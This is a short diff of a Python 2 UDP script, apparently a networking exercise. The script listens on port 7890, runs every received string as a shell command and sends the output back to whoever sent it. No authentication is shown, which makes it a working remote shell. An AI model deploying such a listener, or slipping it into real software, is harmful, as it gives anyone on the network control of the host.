@@ -6,9 +6,8 @@ import  commands
 #              ip_version4,         UDP 
 s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 # defining ip and port below 
-ip="192.168.1.37"
+# ip="192.168.1.37"
 port=7890
-port2=7892
 #  binind ip and port with bind function that takes input as tuple
 s.bind(("",port))
 
@@ -22,7 +21,7 @@ while True:
 	if  'exit' in recv_cmd or 'close' in  recv_cmd :
 		exit()
 	else :
-		s.sendto(commands.getoutput(recv_cmd),(ip,port2))
+		s.sendto(commands.getoutput(recv_cmd),client_data[1])
 
 s.close()
 
